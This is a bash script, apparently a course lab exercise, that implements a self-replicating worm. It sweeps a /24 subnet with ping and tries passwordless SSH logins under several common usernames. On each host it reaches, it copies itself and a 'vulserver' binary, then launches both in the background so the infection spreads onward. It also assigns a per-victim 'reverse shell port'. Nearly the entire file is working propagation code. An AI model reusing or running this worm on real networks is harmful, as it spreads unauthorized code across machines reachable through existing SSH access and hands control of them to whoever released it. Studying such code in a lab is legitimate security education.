#!/bin/bash

NETWORK_PREFIX="192.168.42"
# VULSERVER_URL="https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/refs/heads/main/Simpleworm/vulserver"
# WORM_URL="https://raw.githubusercontent.com/dducktai/NT230.P21.ANTT/refs/heads/main/Simpleworm/worm.sh"
PORT_BASE=4445
USERNAMES=("ubuntu" "server" "victim" "client")
ME=$(hostname -I | awk '{print $1}')
COUNT=0

echo "[*] Starting worm from $ME"

for i in $(seq 1 254); do
    TARGET="$NETWORK_PREFIX.$i"

    if [ "$TARGET" == "$ME" ]; then
        continue
    fi

    # echo "[*] Checking $TARGET..."
    ping -c 1 -W 1 $TARGET &> /dev/null
    if [ $? -eq 0 ]; then
        echo "[+] $TARGET is up!"

        for USER in "${USERNAMES[@]}"; do
            echo "[*] Trying user $USER@$TARGET..."
            ssh -o BatchMode=yes -o ConnectTimeout=3 $USER@$TARGET "echo 1" 2>/dev/null

            if [ $? -eq 0 ]; then
                echo "[+] Found working user: $USER"

                # Copy files
                scp /tmp/vulserver $USER@$TARGET:/tmp/vulserver #Change this to: scp /tmp/vulserver $USER@$TARGET:/tmp/vulserver for the final version
                scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh

                # Count PORT in case of multiple victims
                PORT=$((PORT_BASE + COUNT))
                echo "[*] Assigning reverse shell port: $PORT"

                # Execute payloads
                ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh;
                                   nohup /tmp/vulserver 5000 >/dev/null 2>&1 & 
                                   sleep 1;
                                   nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &

                COUNT=$((COUNT + 1))
                break
            fi
        done
    fi
done